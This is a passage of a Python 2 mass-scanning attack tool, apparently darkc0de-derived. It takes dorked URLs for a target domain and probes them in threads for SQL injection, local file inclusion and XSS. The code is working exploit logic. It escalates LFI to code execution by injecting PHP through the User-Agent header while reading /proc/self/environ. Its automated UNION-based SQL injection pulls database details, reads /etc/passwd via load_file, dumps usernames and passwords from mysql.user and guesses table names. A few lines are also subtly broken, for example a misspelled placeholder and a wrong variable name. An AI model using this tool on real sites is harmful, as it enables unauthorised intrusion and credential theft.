                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False
                
class xssThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicXSS(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False
                
                
def ClassicINJ(url):
        EXT = "'"
        host = url+EXT
        try:
                source = urllib2.urlopen(host).read()
                for type,eMSG in sqlerrors.items():
                        if re.search(eMSG, source):
                                print R+"[!] w00t!,w00t!:", O+host, B+"Error:", type,R+" ---> SQL Injection Found"
				logfile.write("\n"+host)
				vuln.append(host)
                                col.append(host)
                                break
				
				
                        else:
                                pass
        except:
                pass


def ClassicLFI(url):
  lfiurl = url.rsplit('=', 1)[0]
  if lfiurl[-1] != "=":
    lfiurl = lfiurl + "="
  for lfi in lfis:
    try:
      check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
      if re.findall("root:x", check):
	print R+"[!] w00t!,w00t!: ", O+lfiurl+lfi,R+" ---> Local File Include Found"
	lfi_log_file.write("\n"+lfiurl+lfi)
	vuln.append(lfiurl+lfi)
	target = lfiurl+lfi
	target = target.replace("/etc/passwd","/proc/self/environ")
	header = "<? echo md5(baltazar); ?>"
        try:
	  request_web = urllib2.Request(target)
	  request_web.add_header('User-Agent', header)
	  text = urllib2.urlopen(request_web)
	  text = text.read()
	  if re.findall("f14CmsVwmDJfsa7wFVp24rwqH7z4MMjZVYN", text):
	    print R+"[!] w00t!,w00t!: ",O+target,R+" ---> LFI to RCE Found"
	    rce_log_file.write("\n",target)
	    vuln.append(target)
        except:
	  pass
	
    except:
      pass

def ClassicXSS(url):
  for xss in xsses:
    try:
      source = urllib2.urlopen(url+xss.replace("\n","")).read()
      if re.findall("XSS by baltazar", source):
	print R+"[!] w00t!,w00t!: ", O+url+xss,R+" ---> XSS Found (might be false)"
	xss_log_file.write("\n"+url+xss)
	vuln.append(url+xss)
    except:
      pass

def injtest():
  print B+"\n[+] Preparing for SQLi scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...\n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = injThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()
      
def lfitest():
  print B+"\n[+] Preparing for LFI - RCE scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...\n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = lfiThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()

def xsstest():
  print B+"\n[+] Preparing for XSS scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...\n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = xssThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()


new = 1
menu = True
while menu == True:
  if new == 1:
    threads = []
    finallist = []
    vuln = []
    col = []
    darkurl = []

    print W
    sites = raw_input("\nChoose your target(domain)   : ")
    sitearray = [ sites ]

    go = []

    dorks = raw_input("Choose the number of random dorks (0 for all.. may take awhile!)   : "); print ""
    if int(dorks) == 0:
      i = 0
      while i < len(d0rk):
        go.append(d0rk[i])
        i += 1
    else:
      i = 0
      while i < int(dorks):
        go.append(choice(d0rk))
        i += 1
      for g in go:
        print "dork: ",g




    numthreads = raw_input('\nEnter no. of threads : ')
    maxc = raw_input('Enter no. of pages   : ')
    print "\nNumber of SQL errors :",len(sqlerrors)
    print "Number of LFI paths  :",len(lfis)
    print "Number of XSS cheats :",len(xsses)
    print "Number of headers    :",len(header)
    print "Number of threads    :",numthreads
    print "Number of dorks      :",len(go)
    print "Number of pages      :",maxc
    print "Timeout in seconds   :",timeout
    print ""

    usearch = search(maxc)
    new = 0


  print R+"\n[1] SQLi Testing"
  print "[2] SQLi Testing Auto Mode"
  print "[3] LFI - RCE Testing"
  print "[4] XSS Testing"
  print "[5] SQLi and LFI - RCE Testing"
  print "[6] SQLi and XSS Testing"
  print "[7] LFI -RCE and XSS Testing"
  print "[8] SQLi,LFI - RCE and XSS Testing"
  print "[9] Save valid urls to file"
  print "[10] Print valid urls"
  print "[11] Found vuln in last scan"
  print "[12] New scan"
  print "[0] Exit\n"
  chce = raw_input(":")
  if chce == '1':
    injtest()
    
  if chce == '2':
    injtest()
    print B+"\n[+] Preparing for Column Finder ..."
    print "[+] Can take a while ..."
    print "[!] Working ..."
    # Thanks rsauron for schemafuzz
    for host in col:
      print R+"\n[+] Target: ", O+host
      print R+"[+] Attempting to find the number of columns ..."
      print "[+] Testing: ",
      checkfor = []
      host = host.rsplit("'", 1)[0]
      sitenew = host+arg_eva+"and"+arg_eva+"1=2"+arg_eva+"union"+arg_eva+"all"+arg_eva+"select"+arg_eva
      makepretty = ""
      for x in xrange(0, colMax):
	try:
	  sys.stdout.write("%s," % (x))
	  sys.stdout.flush()
	  darkc0de = "dark"+str(x)+"c0de"
	  checkfor.append(darkc0de)
	  if x > 0:
	    sitenew += ","
	  sitenew += "0x"+darkc0de.encode("hex")
	  finalurl = sitenew+arg_end
	  gets += 1
	  source = urllib2.urlopen(finalurl).read()
	  for y in checkfor:
	    colFound = re.findall(y, source)
	    if len(colFound) >= 1:
	      print "\n[+] Column length is:", len(checkfor)
	      nullcol = re.findall(("\d+"), y)
	      print "[+] Found null column at column #:", nullcol[0]
	      for z in xrange(0, len(checkfor)):
		if z > 0:
		  makepretty += ","
		makepretty += str(z)
	      site = host+arg_eva+"and"+arg_eva+"1=2"+arg_eva+"union"+arg_eva+"all"+arg_eva+"select"+arg_eva+makepretty
	      print "[+] SQLi URL:", site+arg_end
	      site = site.replace(","+nullcol[0]+",",",darkc0de,")
	      site = site.replace(arg_eva+nullcol[0]+",",arg_eva+"darkc0de,")
	      site = site.replace(","+nullcol[0],",darkc0de")
	      print "[+] darkc0de URL:", site
	      darkurl.append(site)
	      
	      print "[-] Done!\n"
	      break
	      
	except(KeyboardInterrupt, SystemExit):
	  raise
	except:
	  pass
      
      print "\n[!] Sorry column length could not be found\n"
      ###########
      
    print B+"\n[+] Gathering MySQL Server Configuration..."
    for site in darkurl:
      head_URL = site.replace("darkc0de", "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
      print R+"\n[+] Target:", O+site
      while 1:
	try:
	  gets += 1
	  source = urllib2.urlopen(head_URL).read()
	  match = re.findall("\x1e\x1e\S+", source)
	  if len(match) >= 1:
	    match = match[0][2:].split("\x1e")
	    version = match[0]
	    user = match[1]
	    database = match[2]
	    print W+"\n\tDatabase:", database
	    print "\tUser:", user
	    print "\tVersion:", version
	    version = version[0]
	    
	    load = site.replace("darkc0de", "load_file(0x2f6574632f706173737764)")
	    source = urllib2.urlopen(load).read()
	    if re.findall("root:x", source):
	      load = site.replace("darkc0de", "concat_ws(char(58),load_file(0x"+file.encode("hex")+"),0x62616c74617a6172)")
	      source = urllib2.urlopen(load).read()
	      search = re.findall("baltazar", source)
	      if len(search) > 0:
		print "\n[!] w00t!w00t!: "+site.replace("darkc0de", "load_file(0x"+file.encode("hex")+")")
		
	      load = site.replace("dakrc0de", "concat_ws(char(58),user,password,0x62616c74617a6172)")+arg_eva+"from"+arg_eva+"mysql.user"
	    source = urllib2.urlopen(load).read()
	    if re.findall("baltazar", source):
	      print "\n[!] w00t!w00t!: "+site.replace("darkc0de", "concat_ws(char(58),user,password)")+arg_eva+"from"+arg_eva+"mysql.user"
	  
	  print W+"\n[+] Number of tables:",len(tables)
	  print "[+] Number of columns:",len(columns)
          print "[+] Checking for tables and columns..."
          target = site.replace("darkc0de", "0x62616c74617a6172")+arg_eva+"from"+arg_eva+"T"
	  for table in tables:
            try:
	      target_table = target.replace("T", table)
	      source = urllib2.urlopen(target_table).read()
	      search = re.findall("baltazar", source)
	      if len(search) > 0:
		print "\n[!] w00t!w00t! Found a table called: < "+table+" >"
		print "\n[+] Lets check for columns inside table < "+table+" >"
		for column in columns:
		  try:
		    source = urllib2.urlopen(target_table.replace("0x62616c74617a6172", "concat_ws(char(58),0x62616c74617a6172,"+column+")")).read()
		    search = re.findall("baltazar", source)
		    if len(search) > 0:
		      print "\t[!] w00t!w00t! Found a column called: < "+column+" >"
		  except(KeyboardInterrupt, SystemExit):
		    raise
		  except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
		    pass
	    
		print "\n[-] Done searching inside table < "+table+" > for columns!"
	  
	    except(KeyboardInterrupt, SystemExit):
	      raise
	    except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
	      pass
	  print "[!] Fuzzing is finished!"
	  break	  
	except(KeyboardInterrupt, SystemExit):
	  raise
					  
      
	  
                
  if chce == '3':
    lfitest()
  
  if chce == '4':
    xsstest()
    
  if chce == '5':
    injtest()
    lfitest()
     
  if chce == '6':
    injtest()
    xsstest()
    
  if chce == '7':
    lfitest()
    xsstest()
    
  if chce == '8':
    injtest()
    lfitest()
    xsstest()
    
  if chce == '9':
    print B+"\nSaving valid urls ("+str(len(finallist))+") to file"
    listname = raw_input("Filename: ")
    list_name = open(listname, "w")
    finallist.sort()
    for t in finallist:
      list_name.write(t+"\n")
    list_name.close()
    print "Urls saved, please check", listname
   
  if chce == '10':
    print W+"\nPrinting valid urls:\n"
    finallist.sort()
    for t in finallist:
      print B+t
      
  if chce == '11':
    print B+"\nVuln found ",len(vuln)

  if chce == '12':
    new = 1
    print W+""

  if chce == '0':
    print R+"\n[-] Exiting ..."
    mnu = False
    print W
    sys.exit(1)
